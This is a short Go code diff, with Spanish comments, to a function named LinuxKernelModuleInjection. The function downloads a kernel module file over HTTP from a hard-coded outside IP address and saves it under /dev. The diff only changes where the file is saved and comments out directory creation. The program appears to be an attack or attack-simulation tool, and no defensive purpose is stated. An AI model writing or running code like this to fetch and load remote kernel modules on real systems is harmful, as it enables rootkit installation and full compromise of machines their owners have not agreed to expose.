@@ -7,7 +7,6 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"path/filepath"
 	"strings"
 	"syscall"
 	"time"
@@ -237,15 +236,16 @@ func LinuxKernelModuleInjection() error {
 	fmt.Println("Ejecutando: Linux Kernel Module Injection")
 
 	url := "http://34.27.180.215/sitio/cust0m_mod.ko"
-	dirPath := "/dev/ddd"
-	filePath := filepath.Join(dirPath, "cust0m_mod.ko")
+	filePath := "/dev/cust0m_mod.ko"
+	//dirPath := "/dev/ddd"
+	//filePath := filepath.Join(dirPath, "cust0m_mod.ko")
 
 	// Crear el directorio si no existe
-	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
-		if err := os.MkdirAll(dirPath, 0755); err != nil {
-			return err
-		}
-	}
+	// if _, err := os.Stat(dirPath); os.IsNotExist(err) {
+	// 	if err := os.MkdirAll(dirPath, 0755); err != nil {
+	// 		return err
+	// 	}
+	// }
 
 	// Descargar el archivo
 	response, err := http.Get(url)
